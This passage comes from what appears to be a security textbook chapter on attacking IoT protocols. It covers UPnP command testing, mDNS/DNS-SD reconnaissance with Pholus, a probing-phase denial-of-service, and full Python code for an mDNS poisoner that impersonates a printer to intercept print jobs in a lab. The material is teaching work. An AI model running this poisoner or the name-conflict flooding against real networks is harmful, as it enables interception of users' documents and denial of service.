+<pre><code>upnp&gt; <b>host send </b><b>0</b><b> WANConnectionDevice  WANIPv6FirewallControl  GetFirewallStatus</b>
+InboundPinholeAllowed : 1
+FirewallEnabled : 1
+upnp&gt; <b>host send </b><b>0</b><b> WANConnectionDevice WANIPConnection GetStatusInfo</b>
+NewUptime : 10456
+NewLastConnectionError : ERROR_NONE
+NewConnectionStatus : Connected</code></pre>
+<p>But the tool might not always indicate that the command succeeded, so remember to have a packet analyzer like Wireshark active at all times to understand what happens behind the scenes. </p>
+<p>Remember that running <code>host details</code> will give you a long list of all the advertised commands, but you should still try to test them all. The following output shows only the first portion of the list for the OpenWrt system we configured earlier:</p>
+<pre><code>upnp&gt; <b>host details 0</b>
+Host name:          [fd37:84e0:6d4f::1]:5000
+UPNP XML File:      http://[fd37:84e0:6d4f::1]:5000/rootDesc.xml
+
+Device information: 
+    Device Name: InternetGatewayDevice
+        Service Name: Device Protection
+            controlURL: /ctl/DP
+            eventSUbURL: /evt/DP
+            serviceId: urn:upnp-org:serviceId:DeviceProtection1
+            SCPDURL: /DP.xml
+            fullName: urn:schemas-upnp-org:service:DeviceProtection:1
+            ServiceActions:
+<span epub:type="pagebreak" title="131" id="Page_131"/>                GetSupportedProtocols
+                    ProtocolList
+                        SupportedProtocols: 
+                            dataType: string
+                            sendEvents: N/A
+                            allowedVallueList: []
+                         direction: out
+                SendSetupMessage       
+                …</code></pre>
+<p>This output contains only a small portion of the long list of advertised UPnP commands.</p>
+<h3 id="h2-500907c06-0005">Other UPnP Attacks</h3>
+<p class="BodyFirst">You could try other attacks against UPnP as well. For example, you could exploit a pre-authentication XSS vulnerability on a router’s web interface using UPnP’s port-forwarding capability. This kind of attack would work remotely, even if the router blocks WAN requests. To do so, you would first socially engineer the user to visit a website that hosts the malicious JavaScript payload with the XSS. The XSS would allow the vulnerable router to enter the same LAN as the user, so you could send it commands through its UPnP service. These commands, in the form of specially crafted XML requests inside an XMLHttpRequest object, can force the router to forward ports from inside the LAN to the internet.  </p>
+<h2 id="h1-500907c06-0002">Exploiting mDNS and DNS-SD</h2>
+<p class="BodyFirst"><em>Multicast DNS</em> (<em>mDNS</em>) is a zero-configuration protocol that lets you perform DNS-like operations on the local network in the absence of a conventional, unicast DNS server. The protocol uses the same API, packet formats, and operating semantics as DNS, allowing you to resolve domain names on the local network. <em>DNS Service Discovery</em> (<em>DNS-SD</em>) is a protocol that allows clients to discover a list of named instances of services (such as <em>test._ipps._tcp.local</em>, or <em>linux._ssh._tcp.local</em>) in a domain using standard DNS queries. DNS-SD is most often used in conjunction with mDNS but isn’t dependent on it. They’re both used by many IoT devices, such as network printers, Apple TVs, Google Chromecast, Network-Attached Storage (NAS) devices, and cameras. Most modern operating systems support them. </p>
+<p>Both protocols operate within the same <em>broadcast</em> domain, which means that devices share the same <em>data link layer</em>, also called the local link or layer 2 in the computer networking Open Systems Interconnection (OSI) model. This means messages won’t pass through routers, which operate at layer 3. The devices must be connected to the same Ethernet repeaters or network switches to listen and reply to these multicast messages.</p>
+<p>Local-link protocols can introduce vulnerabilities for two reasons. First, even though you’ll normally encounter these protocols in the local link, the local network isn’t necessarily a trusted one with cooperating participants. Complex network environments often lack proper segmentation, allowing <span epub:type="pagebreak" title="132" id="Page_132"/>attackers to pivot from one part of the network to the other (for example, by compromising the routers). In addition, corporate environments often employ Bring Your Own Device (BYOD) policies that allow staff to use their personal devices in these networks. This situation gets even worse in public networks, such as those in airports or cafes. Second, insecure implementations of these services can allow attackers to exploit them remotely, completely bypassing the local-link containment. </p>
+<p>In this section, we’ll examine how to abuse these two protocols in IoT ecosystems. You can perform reconnaissance, man-in-the-middle attacks, denial of service attacks, unicast DNS cache poisoning, and more! </p>
+<h3 id="h2-500907c06-0006">How mDNS Works</h3>
+<p class="BodyFirst">Devices use mDNS when the local network lacks a conventional unicast DNS server. To resolve a domain name for a local address using mDNS, the device sends a DNS query for a domain name ending with <em>.local</em> to the multicast address 224.0.0.251 (for IPv4) or FF02::FB (for IPv6). You can also use mDNS to resolve global domain names (non <em>.local</em> ones), but mDNS implementations are supposed to disable this behavior by default. mDNS requests and responses use UDP and port 5353 as both the source and destination port. </p>
+<p>Whenever a change in the connectivity of an mDNS responder occurs, it must perform two activities: <em>Probing</em> and <em>Announcing</em>. During Probing, which happens first, the host queries (using the query type <code>"ANY"</code>, which corresponds to the value 255 in the QTYPE field in the mDNS packet) the local network to check whether the records it wants to announce are already in use. If they aren’t in use, the host then <em>Announces</em> its newly registered records (contained in the packet’s Answer section) by sending unsolicited mDNS responses to the network.</p>
+<p>The mDNS replies contain several important flags, including a Time-to-Live (TTL) value that signifies how many seconds the record is valid. Sending a reply with <code>TTL=0</code> means that the corresponding record should be cleared. Another important flag is the QU bit, which denotes whether or not the query is a unicast query. If the QU bit isn’t set, the packet is a multicast query (QM). Because it’s possible to receive unicast queries outside of the local link, secure mDNS implementations should always check that the source address in the packet matches the local subnet address range.</p>
+<h3 id="h2-500907c06-0007">How DNS-SD Works</h3>
+<p class="BodyFirst">DNS-SD allows clients to discover available services on the network. To use it, clients send standard DNS queries for pointer records (PTR), which map the type of service to a list of names of specific instances of that type of service. </p>
+<p>To request a PTR record, clients use the name form <code>"&lt;Service&gt;.&lt;Domain&gt;"</code>. The<code> &lt;Service&gt; </code>part is a pair of DNS labels: an underscore character, followed by the service name (for example, _ipps, _printer, or _ipp) and either <code>_tcp</code> or <code>_udp</code>. The <code>&lt;Domain&gt;</code> portion is <code>".local"</code>. Responders then return the PTR records that point to the accompanying service (SRV) and text (TXT) <span epub:type="pagebreak" title="133" id="Page_133"/>records. An mDNS PTR record contains the name of the service, which is the same as the name of the SRV record without the instance name: in other words, it points to the SRV record. Here is an example of a PTR record:  </p>
+<pre><code>_ipps._tcp.local: type PTR, class IN, test._ipps._tcp.local</code></pre>
+<p>The part of the PTR record to the left of the colon is its name, and the part on the right is the SRV record to which the PTR record points. The SRV record lists the target host and port where the service instance can be reached. For example, <a id="figureanchor6-4" href="#figure6-4">Figure 6-4</a> shows a <code>"test._ipps._tcp.local"</code> SRV record in Wireshark. </p>
+<figure>
+<img src="Images/f06004.png" alt="f06004" width="750" height="170"/>
+<figcaption><p><a id="figure6-4">Figure 6-4:</a> An example SRV record for the service <code>"test._ipps._tcp.local"</code>. The <code>Target</code> and <code>Port</code> fields contain the hostname and listening port for the service.</p></figcaption>
+</figure>
+<p>SRV names have the format <code>"&lt;Instance&gt;.&lt;Service&gt;.&lt;Domain&gt;"</code>. The label <code>&lt;Instance&gt;</code> includes a user-friendly name for the service (<code>test</code> in this case). The <code>&lt;Service&gt; </code>label identifies what the service does and what application protocol it uses to do it. It’s composed of a set of DNS labels: an underscore character, followed by the service name (for example <code>_ipps</code>,<code> _ipp</code>,<code> _http</code>), followed by the transport protocol (<code>_tcp</code>,<code> _udp</code>,<code> _sctp</code>, and so on). The <code>&lt;Domain&gt;</code> portion specifies the DNS subdomain where these names are registered. For mDNS, it’s <em>.local</em>, but it can be anything when you’re using unicast DNS. The SRV record also contains <code>Target</code> and <code>Port</code> sections containing the hostname and port where the service can be found (<a href="#figure6-4">Figure 6-4</a>). </p>
+<p>The TXT record, which has the same name as the SRV record, provides additional information about this instance in a structured form, using key/value pairs. The TXT record contains the information needed when the IP address and port number (contained in the SRV record) for a service aren’t sufficient to identify it. For example, in the case of the old Unix LPR protocol, the TXT record specifies the queue name. </p>
+<h3 id="h2-500907c06-0008">Conducting Reconnaissance with mDNS and DNS-SD</h3>
+<p class="BodyFirst">You can learn a lot about the local network by simply sending mDNS requests and capturing multicast mDNS traffic. For example, you could discover available services, query specific instances of a service, enumerate domains, and identify a host. For host identification specifically, the <code>_workstation</code> special service must be enabled on the system you’re trying to identify. </p>
+<p>We’ll perform reconnaissance using a tool called Pholus by Antonios Atlasis. Download it from <a href="https://github.com/aatlasis/Pholus/" class="LinkURL">https://github.com/aatlasis/Pholus/</a>. Note that Pholus <span epub:type="pagebreak" title="134" id="Page_134"/>is written in Python 2, which is no longer officially supported. You might have to manually download Python2 pip, like we did with the Umap installation in “Getting and Using Umap” on page 128. Then you’ll need to install Scapy using the Python2 version of pip:</p>
+<pre><code># <b>pip install scapy</b></code></pre>
+<p>Pholus will send mDNS requests (<code>-rq</code>) on the local network and capture multicast mDNS traffic (for <code>-stimeout</code> 10 seconds) to identify a lot of interesting information:</p>
+<pre><code>root@kali:~/zeroconf/mdns/Pholus# <b>./pholus.py eth0 -rq -stimeout 10</b>
+source MAC address: 00:0c:29:32:7c:14 source IPv4 Address: 192.168.10.10 source IPv6 address: fdd6:f51d:5ca8:0:20c:29ff:fe32:7c14
+Sniffer filter is: not ether src 00:0c:29:32:7c:14 and udp and port 5353
+I will sniff for 10 seconds, unless interrupted by Ctrl-C
+------------------------------------------------------------------------
+Sending mdns requests
+30:9c:23:b6:40:15 192.168.10.20 QUERY Answer: _services._dns-sd._udp.local. PTR Class:IN "_nvstream_dbd._tcp.local."
+9c:8e:cd:10:29:87 192.168.10.245 QUERY Answer: _services._dns-sd._udp.local. PTR Class:IN "_http._tcp.local."
+00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Question: 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.f.4.d.6.0.e.4.8.7.3.d.f.ip6.arpa. * (ANY) QM Class:IN
+00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Question: OpenWrt-1757.local. * (ANY) QM Class:IN
+00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Auth_NS: OpenWrt-1757.local. HINFO Class:IN "X86_64LINUX"
+00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Auth_NS: OpenWrt-1757.local. AAAA Class:IN "fd37:84e0:6d4f::1"
+00:0c:29:7f:68:f9 fd37:84e0:6d4f::1 QUERY Auth_NS: 1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.f.4.d.6.0.e.4.8.7.3.d.f.ip6.arpa. PTR Class:IN "OpenWrt-1757.local."</code></pre>
+<p><a id="figureanchor6-5" href="#figure6-5">Figure 6-5</a> shows the Wireshark dump from the Pholus query. Notice that the replies are sent back to the multicast address on UDP port 5353. Because anyone can receive the multicast messages, an attacker can easily send the mDNS query from a spoofed IP address and still hear the replies on the local network. </p>
+<p>Learning more about what services are exposed on the network is one of the first steps in any security test. Using this approach, you can find the services with potential vulnerabilities and then exploit them.</p>
+<h3 id="h2-500907c06-0009">Abusing the mDNS Probing Phase</h3>
+<p class="BodyFirst">In this section, we’ll exploit the mDNS Probing phase. In this phase, which occurs whenever an mDNS responder starts up or changes its connectivity, the responder asks the local network if there are any resource records with the same name as the one it’s planning to announce. To do this, it sends a query of type <code>"ANY" (255)</code>, as shown in <a id="figureanchor6-6" href="#figure6-6">Figure 6-6</a>.</p>
+<span epub:type="pagebreak" title="135" id="Page_135"/><figure>
+<img src="Images/f06005.png" alt="f06005" width="750" height="421"/>
+<figcaption><p><a id="figure6-5">Figure 6-5:</a> Pholus sending mDNS requests and receiving replies on the multicast address</p></figcaption>
+</figure>
+<p>If the answer contains the record in question, the probing host should choose a new name. If 15 conflicts take place within 10 seconds, the host must then wait at least five seconds before any additional attempt. Additionally, if one minute passes during which the host can’t find an unused name, it reports an error to the user.</p>
+<figure>
+<img src="Images/f06006.png" alt="f06006" width="750" height="180"/>
+<figcaption><p><a id="figure6-6">Figure 6-6:</a> An example of an mDNS <code>"ANY"</code> query for <code>"test._ipps._tcp.local"</code></p></figcaption>
+</figure>
+<p>The Probing phase lends itself to the following attack: an adversary can monitor mDNS traffic for a probing host and then continuously send responses containing the record in question, constantly forcing the host to change its name until the host quits. This forces a configuration change (for example, that the probing host has to select a new name for the service it provides) and, potentially, a denial of service attack, if the host is unable to access the resource it’s looking for. </p>
+<p>For a quick demonstration of this attack, use Pholus with the argument <code>-afre</code>:</p>
+<pre><code># <b>python pholus.py eth0 -afre -stimeout 1000</b></code></pre>
+<p><span epub:type="pagebreak" title="136" id="Page_136"/>Replace the <code>eth0</code> argument with your preferred network interface. The <code>-afre</code> argument makes Pholus send fake mDNS replies for <code>-stimeout</code> seconds. </p>
+<p>This output shows Pholus blocking a new Ubuntu host on the network: </p>
+<pre><code>00:0c:29:f4:74:2a 192.168.10.219 QUERY Question: <b>ubuntu-133.local.</b> * (ANY) QM Class:IN
+00:0c:29:f4:74:2a 192.168.10.219 QUERY Auth_NS: ubuntu-133.local. AAAA Class:IN "fdd6:f51d:5ca8:0:c81e:79a4:8584:8a56"
+00:0c:29:f4:74:2a 192.168.10.219 QUERY Auth_NS: 6.5.a.8.4.8.5.8.4.a.9.7.e.1.8.c.0.0.0.0.8.a.c.5.d.1.5.f.6.d.d.f.ip6.arpa. PTR Class:IN "ubuntu-133.local."
+Query Name =  6.5.a.8.4.8.5.8.4.a.9.7.e.1.8.c.0.0.0.0.8.a.c.5.d.1.5.f.6.d.d.f.ip6.arpa  Type= 255
+00:0c:29:f4:74:2a fdd6:f51d:5ca8:0:e923:d17e:4a0f:184d QUERY Question: 6.5.a.8.4.8.5.8.4.a.9.7.e.1.8.c.0.0.0.0.8.a.c.5.d.1.5.f.6.d.d.f.ip6.arpa. * (ANY) QM Class:IN
+Query Name =  ubuntu-134.local  Type= 255
+00:0c:29:f4:74:2a fdd6:f51d:5ca8:0:e923:d17e:4a0f:184d QUERY Question: ubuntu-134.local. * (ANY) QM Class:IN
+00:0c:29:f4:74:2a fdd6:f51d:5ca8:0:e923:d17e:4a0f:184d QUERY Auth_NS: ubuntu-134.local. AAAA Class:IN "fdd6:f51d:5ca8:0:c81e:79a4:8584:8a56"</code></pre>
+<p>When the Ubuntu host booted up, its mDNS responder tried to query for the local name <code>ubuntu.local</code>. Because Pholus continuously sent fake replies indicating that the attacker owned that name, the Ubuntu host kept iterating over new potential names, like <code>ubuntu-2.local</code>, <code>ubuntu-3.local,</code> and so on without ever being able to register. Notice that the host reached up to the naming <code>ubuntu-133.local</code> without success.</p>
+<h3 id="h2-500907c06-0010">mDNS and DNS-SD Man-in-the-Middle Attacks </h3>
+<p class="BodyFirst">Now let’s try a more advanced attack with a bigger impact: mDNS poisoning attackers on the local network place themselves in a privileged, man-in-the-middle position between a client and some service by exploiting the lack of authentication in mDNS. This allows them to capture and modify potentially sensitive data transmitted over the network or simply deny service. </p>
+<p>In this section, we’ll build an mDNS poisoner in Python that pretends to be a network printer to capture documents intended for the real printer. Then we’ll test the attack in a virtual environment. </p>
+<h4 id="h3-500907c06-0006">Setting Up the Victim Server</h4>
+<p class="BodyFirst">We’ll start by setting up the victim machine to run an emulated printer using <em>ippserver</em>. Ippserver is a simple Internet Printing Protocol (IPP) server that can act as a very basic print server. We used Ubuntu 18.04.2 LTS (IP <span epub:type="pagebreak" title="137" id="Page_137"/>address: 192.168.10.219) in VMware, but the exact specifics of the operating system shouldn’t matter as long as you can run a current version of ippserver. </p>
+<p>After installing the operating system, run the print server by entering the following command in a terminal:</p>
+<pre><code>$ <b>ippserver test -v</b></code></pre>
+<p>This command invokes the ippserver with the default configuration settings. It should listen on TCP port 8000, announce a service named <code>test</code>, and enable verbose output. If you have Wireshark open when you start the server, you should notice that the server performs the probing phase by sending an mDNS query on the local multicast address 224.0.0.251, asking if anyone already has any print services with the name <code>test </code>(<a id="figureanchor6-7" href="#figure6-7">Figure 6-7</a>). </p>
+<figure>
+<img src="Images/f06007.png" alt="f06007" width="750" height="323"/>
+<figcaption><p><a id="figure6-7">Figure 6-7:</a> Ippserver sends an mDNS query asking if the resource records related to the printer service named <code>test</code> are already in use.</p></figcaption>
+</figure>
+<p>This query also contains some <em>proposed </em>records in the Authority Section (you can see these under <code>Authoritative nameservers</code> in <a href="#figure6-7">Figure 6-7</a>). Because this isn’t an mDNS reply, those records don’t count as official responses; instead, they’re used for tiebreaking simultaneous probes, a situation that doesn’t concern us now.</p>
+<p>The server will then wait a couple of seconds, and if no one else on the network replies, it will move on to the Announcing phase. In this phase, ippserver sends an unsolicited mDNS response containing, in the Answer Section, all of its newly registered resource records (<a id="figureanchor6-8" href="#figure6-8">Figure 6-8</a>). </p>
+<span epub:type="pagebreak" title="138" id="Page_138"/><figure>
+<img src="Images/f06008.png" alt="f06008" width="750" height="412"/>
+<figcaption><p><a id="figure6-8">Figure 6-8:</a> During the Announcing phase, ippserver sends an unsolicited mDNS response containing the newly registered records.</p></figcaption>
+</figure>
+<p>This response includes a set of PTR, SRV, and TXT records for each service, as explained in “How DNS-SD Works” on page 132. It also includes A records (for IPv4) and AAAA records (for IPv6), which are used to resolve the domain name with IP addresses. The A record for <code>ubuntu.local</code> in this case will contain the IP address 192.168.10.219.</p>
+<h4 id="h3-500907c06-0007">Setting Up the Victim Client</h4>
+<p class="BodyFirst">For the victim requesting the printing service, you can use any device running an operating system that supports mDNS and DNS-SD. In this example, we’ll use a MacBook Pro running macOS High Sierra. Apple’s zero-configuration networking implementation is called Bonjour, and it’s based on mDNS. Bonjour should be enabled by default in macOS. If it isn’t, you can enable it by entering the following command in the Terminal: </p>
+<pre><code>$ <b>sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist</b></code></pre>
+<p><a id="figureanchor6-9" href="#figure6-9">Figure 6-9</a> shows how <code>mDNSResponder</code> (Bonjour’s main engine) automatically finds the legitimate Ubuntu print server when we click <b>System Preferences </b><span class="MenuArrow">▶</span><b> Printers &amp; Scanners</b> and click the <b>+</b> button to add a new printer. </p>
+<p>To make the attack scenario more realistic, we assume that the MacBook already has a preconfigured network printer named <code>test</code>. One of the most important aspects of automatic service discovery is that it doesn’t matter<em> </em>if our system has already discovered the service in the past! This <span epub:type="pagebreak" title="139" id="Page_139"/>increases flexibility (although it sacrifices security). A client needs to be able to communicate with the service, even if the hostname and IP address have changed; so whenever the macOS client needs to print a document, it will send a new mDNS query asking where the <code>test</code> service is, even if that service has the same hostname and IP address as it did the last time. </p>
+<figure>
+<img src="Images/f06009.png" alt="f06009" width="750" height="469"/>
+<figcaption><p><a id="figure6-9">Figure 6-9:</a> The legitimate printer automatically discovered by macOS’s built-in Bonjour service</p></figcaption>
+</figure>
+<h4 id="h3-500907c06-0008">How Typical Client and Server Interactions Work</h4>
+<p class="BodyFirst">Now let’s look at how the macOS client requests the printer service when things are working correctly. As shown in <a id="figureanchor6-10" href="#figure6-10">Figure 6-10</a>, the client’s mDNS query about the <code>test</code> service will ask about the SRV and TXT records belonging to <code>test._ipps._tcp.local</code>. It also asks for similar alternative services, such as <code>test._printer._tcp.local</code> and <code>test._ipp._tcp.local</code>.</p>
+<figure>
+<img src="Images/f06010.png" alt="f06010" width="730" height="46"/>
+<figcaption><p><a id="figure6-10">Figure 6-10:</a> The mDNS query the client will initially send to discover local network printers asks again about the <code>test</code> ipps service, even though it might have used it in the past.</p></figcaption>
+</figure>
+<p>The Ubuntu system will then reply as it did in the Announcing phase. It will send responses that contain PTR, SRV, and TXT records for all the requested services that it’s supposed to have authority over (for example, <code>test._ipps._tcp.local</code>) and A records (as well as AAAA records, if the host has IPv6 enabled). The TXT record (<a id="figureanchor6-11" href="#figure6-11">Figure 6-11</a>) is particularly important in this case, because it contains the exact URL (<code>adminurl</code>) for the printer jobs to be posted.</p>
+<span epub:type="pagebreak" title="140" id="Page_140"/><figure>
+<img src="Images/f06011.png" alt="f06011" width="750" height="445"/>
+<figcaption><p><a id="figure6-11">Figure 6-11:</a> Part of the TXT record, which is included in the ippserver’s mDNS response Answer section. The <code>adminurl</code> has the exact location of the print queue.</p></figcaption>
+</figure>
+<p>Once the macOS client has this information, it now knows everything it needs to send its print job to the Ubuntu ippserver:</p>
+<ul>
+<li>From the PTR record, it knows that there is an <code>_ipps._tcp.local</code> with a service named <code>test</code>.</li>
+<li>From the SRV record, it knows that this <code>test._ipps._tcp.local</code> service is hosted on <code>ubuntu.local</code> on TCP port 8000.</li>
+<li>From the A record, it knows that <code>ubuntu.local</code> resolves to 192.168.10.219.</li>
+<li>From the TXT record, it knows that the URL to post the print jobs is <a href="https://ubuntu.8000/ipp/print" class="LinkURL">https://ubuntu.8000/ipp/print</a>.</li>
+</ul>
+<p>The macOS client will then initiate an HTTPS session with ippserver on port 8000 and transmit the document to be printed:</p>
+<pre><code>[Client 1] Accepted connection from "192.168.10.199".
+[Client 1] Starting HTTPS session.
+[Client 1E] Connection now encrypted.
+[Client 1E] POST /ipp/print
+[Client 1E] Continue
+[Client 1E] Get-Printer-Attributes successful-ok
+[Client 1E] OK
+[Client 1E] POST /ipp/print
+[Client 1E] Continue
+[Client 1E] Validate-Job successful-ok
+[Client 1E] OK
+[Client 1E] POST /ipp/print
+[Client 1E] Continue
+[Client 1E] Create-Job successful-ok
+[Client 1E] OK</code></pre>
+<p>You should see output like this from the ippserver.</p>
+<h4 id="h3-500907c06-0009"><span epub:type="pagebreak" title="141" id="Page_141"/>Creating the mDNS Poisoner</h4>
+<p class="BodyFirst">The mDNS poisoner we’ll write using Python listens for multicast mDNS traffic on UDP port 5353 until it finds a client trying to connect to the printer, and then sends it replies. <a id="figureanchor6-12" href="#figure6-12">Figure 6-12</a> illustrates the steps involved. </p>
+<figure>
+<img src="Images/f06012.png" alt="f06012" width="750" height="304"/>
+<figcaption><p><a id="figure6-12">Figure 6-12:</a> mDNS poisoning attack steps</p></figcaption>
+</figure>
+<p>First, the attacker listens for multicast mDNS traffic on UDP port 5353. When the macOS client rediscovers the <code>test</code> network printer and sends an mDNS query, the attacker continuously sends replies to the poison client’s cache. If the attacker wins the race against the legitimate printer, the attacker becomes a man in the middle, fielding traffic from the client. The client sends a document to the attacker, which the attacker can then forward to the printer to avoid detection. If the attacker doesn’t forward the document to the printer, the user might get suspicious when it isn’t printed.</p>
+<p>We’ll start by creating a skeleton file (<a id="listinganchor6-2" href="#listing6-2">Listing 6-2</a>) and then implementing simple network server functionality for listening on the multicast mDNS address. Note that the script is written in Python 3.</p>
+<pre><code>  #!/usr/bin/env python
+  import time, os, sys, struct, socket
+  from socketserver import UDPServer, ThreadingMixIn
+  from socketserver import BaseRequestHandler
+  from threading import Thread
+  from dnslib import *
+
+  MADDR = ('224.0.0.251', 5353)
+class UDP_server(ThreadingMixIn, UDPServer): <span class="CodeAnnotation">1</span>
+    allow_reuse_address = True
+    def server_bind(self):
+      self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
+      mreq = struct.pack("=4sl", socket.inet_aton(MADDR[0]), socket.INADDR_ANY)
+      self.socket.setsockopt(socket.IPPROTO_IP, <span class="CodeAnnotation">2</span>socket.IP_ADD_MEMBERSHIP, mreq)
+      UDPServer.server_bind(self)
+
+  def MDNS_poisoner(host, port, handler): <span class="CodeAnnotation">3</span>
+    try:
+      server = UDP_server((host, port), handler)
+      server.serve_forever()
+<span epub:type="pagebreak" title="142" id="Page_142"/>    except:
+      print("Error starting server on UDP port " + str(port))
+
+class MDNS(BaseRequestHandler):
+    def handle(self):
+      target_service = ''
+      data, soc = self.request
+      soc.sendto(d.pack(), MADDR)
+      print('Poisoned answer sent to %s for name %s' % (self.client_address[0], target_service))
+
+def main(): <span class="CodeAnnotation">4</span>
+    try:
+      server_thread = Thread(target=MDNS_poisoner,  args=('', 5353, MDNS,))
+      server_thread.setDaemon(True)
+      server_thread.start()
+
+      print("Listening for mDNS multicast traffic")
+      while True:
+        time.sleep(0.1)
+
+    except KeyboardInterrupt:
+      sys.exit("\rExiting...")
+
+  if __name__ == '__main__':
+    main()</code></pre>
+<p class="CodeListingCaption"><a id="listing6-2">Listing 6-2:</a> The skeleton file for the mDNS poisoner</p>
+<p>We start with the imports for the Python modules we’ll need. The <code>socketserver </code>framework simplifies the task of writing network servers. For parsing and crafting mDNS packets, we import <em>dnslib</em>, a simple library to encode and decode DNS wire-format packets. We then define a global variable <code>MADDR </code>that holds the mDNS multicast address and default port (5353). </p>
+<p>We create the <code>UDP_server </code><span class="CodeAnnotation">1</span><code/>using the <code>ThreadingMixIn</code> class, which implements parallelism using threads. The server’s constructor will call the <code>server_bind</code> function to bind the socket to the desired address. We enable <code>allow_reuse_address</code><em> </em>so we can reuse the bound IP address<em> </em>and the <code>SO_REUSEADDR</code> socket option, which allows the socket to forcibly bind to the same port when we restart the program. We then have to join the multicast group (224.0.0.251) with <code>IP_ADD_MEMBERSHIP</code><em> </em><span class="CodeAnnotation">2</span>.  </p>
+<p>The <code>MDNS_poisoner</code> function <span class="CodeAnnotation">3</span> creates an instance of the <code>UDP_server</code> and calls <code>serve_forever</code> on it to handle requests until an explicit shutdown. The <code>MDNS</code><em> </em>class handles all incoming requests, parsing them and sending back the replies. Because this class is the brainpower of the poisoner, we’ll explore the class in more detail later. You’ll have to replace this block of code (<a id="listinganchor6-3" href="#listing6-3">Listing 6-3</a>) with the complete <code>MDNS</code> class in <a href="#listing6-2">Listing 6-2</a>.</p>
+<p>The <code>main</code><em> </em>function <span class="CodeAnnotation">4</span> creates the main thread for the mDNS server. This thread will automatically start new threads for each request, which the <code>MDNS.handle </code>function will handle.<em> </em>With<em> </em><code>setDaemon(True)</code>, the server will exit when the main thread terminates, and you can terminate the main thread <span epub:type="pagebreak" title="143" id="Page_143"/>by pressing <span class="KeyCaps">CTRL</span>-C, which will trigger the <code>KeyboardInterrupt </code>exception. The main program will finally enter an infinite loop, and the threads will handle all the rest.</p>
+<p>Now that we’ve created the skeleton, let’s outline the methodology for creating the <code>MDNS</code> class, which implements the mDNS poisoner: </p>
+<ol class="decimal">
+<li value="1">1.	Capture network traffic to determine which packets you need to reproduce and save the <em>pcap</em> file for later.</li>
+<li value="2">2.	Export the raw packet bytes from Wireshark. </li>
+<li value="3">3.	Search for libraries implementing existing functionality, such as dnslib for the DNS packet handling, so you don’t reinvent the wheel.</li>
+<li value="4">4.	When you need to parse incoming packets, as is the case with the mDNS query, first use the previously exported packets from Wireshark to initially feed into the tool instead of getting new ones from the network. </li>
+<li value="5">5.	Start sending packets on the network, and then compare them with the first traffic dump.</li>
+<li value="6">6.	Finalize and refine the tool by cleaning up and commenting code, as well as adding real-time configurability via command line arguments.</li>
+</ol>
+<p>Let’s see what our most important class, <code>MDNS</code>, does (<a href="#listing6-3">Listing 6-3</a>). Replace the <code>MDNS</code> block in <a href="#listing6-2">Listing 6-2</a> with this code.</p>
+<pre><code>class MDNS(BaseRequestHandler):
+  def handle(self):
+    target_service = ''
+    data, soc = self.request <span class="CodeAnnotation">1</span>
+    d = DNSRecord.parse(data) <span class="CodeAnnotation">2</span>
+
+    # basic error checking - does the mDNS packet have at least 1 question?
+    if d.header.q &lt; 1:
+      return
+
+    # we are assuming that the first question contains the service name we want to spoof
+    target_service = d.questions[0]._qname <span class="CodeAnnotation">3</span>
+
+    # now create the mDNS reply that will contain the service name and our IP address
+    d = DNSRecord(DNSHeader(qr=1, id=0, bitmap=33792)) <span class="CodeAnnotation">4</span>
+    d.add_answer(RR(target_service, QTYPE.SRV, ttl=120, rclass=32769, rdata=SRV(priority=0, target='kali.local', weight=0, port=8000)))
+    d.add_answer(RR('kali.local', QTYPE.A, ttl=120, rclass=32769, rdata=A("192.168.10.10"))) <span class="CodeAnnotation">5</span>
+    d.add_answer(RR('test._ipps._tcp.local', QTYPE.TXT, ttl=4500, rclass=32769, rdata=TXT(["rp=ipp/print", "ty=Test Printer", "adminurl=https://kali:8000/ipp/print", "pdl=application/pdf,image/jpeg,image/pwg-raster", "product=(Printer)", "Color=F", "Duplex=F", "usb_MFG=Test", "usb_MDL=Printer", "UUID=0544e1d1-bba0-3cdf-5ebf-1bd9f600e0fe", "TLS=1.2", "txtvers=1", "qtotal=1"]))) <span class="CodeAnnotation">6</span>
+
+    soc.sendto(d.pack(), MADDR) <span class="CodeAnnotation">7</span>
+    print('Poisoned answer sent to %s for name %s' % (self.client_address[0], target_service))</code></pre>
+<p class="CodeListingCaption"><a id="listing6-3">Listing 6-3:</a> The final <var>MDNS</var> class for our poisoner</p>
+<p><span epub:type="pagebreak" title="144" id="Page_144"/>We’re using Python’s <code>socketserver </code>framework to implement the server. The <code>MDNS</code> class has to subclass the framework’s <code>BaseRequestHandler</code> class and override its <code>handle()</code> method to process incoming requests. For UDP services, <code>self.request </code><span class="CodeAnnotation">1</span> returns a string and socket pair, which we save locally. The string contains the data incoming from the network, and the socket pair is the IP address and port belonging to the sender of that data. </p>
+<p>We then parse the incoming <code>data</code> using <code>dnslib </code><span class="CodeAnnotation">2</span>, converting them into a <code>DNSRecord</code> class that we can then use to extract the domain name <span class="CodeAnnotation">3</span> from the <code>QNAME</code> of the Question section. The Question section is the part of the mDNS packet that contains the Queries (for example, see <a href="#figure6-7">Figure 6-7</a>). Note that to install <code>dnslib</code>, you can do the following:</p>
+<pre><code># <b>git clone https://github.com/paulc/dnslib</b>
+# <b>cd dnslib</b>
+# <b>python setup.py install</b></code></pre>
+<p>Next, we must create our mDNS reply <span class="CodeAnnotation">4</span> containing the three DNS records we need (SRV, A, and TXT). In the Answers section, we add the SRV record that associates the <code>target_service</code> with our hostname (<code>kali.local</code>) and port 8000. We add the A record <span class="CodeAnnotation">5</span> that resolves the hostname to the IP address. Then we add the TXT record <span class="CodeAnnotation">6</span> that, among other things, contains the URL for the fake printer to be contacted at https://kali:8000/ipp/print.</p>
+<p>Finally, we send the reply to the victim through our UDP socket <span class="CodeAnnotation">7</span>. </p>
+<p>As an exercise, we leave it to you to configure the hardcoded values contained in the mDNS reply step. You could also make the poisoner more flexible so it poisons a specific target IP and service name only. </p>
+<h4 id="h3-500907c06-0010">Testing the mDNS Poisoner</h4>
+<p class="BodyFirst">Now let’s test the mDNS poisoner. Here is the attacker’s poisoner running: </p>
+<pre><code>root@kali:~/mdns/poisoner# <b>python</b><b>3</b><b> poison.py</b>
+Listening for mDNS multicast traffic
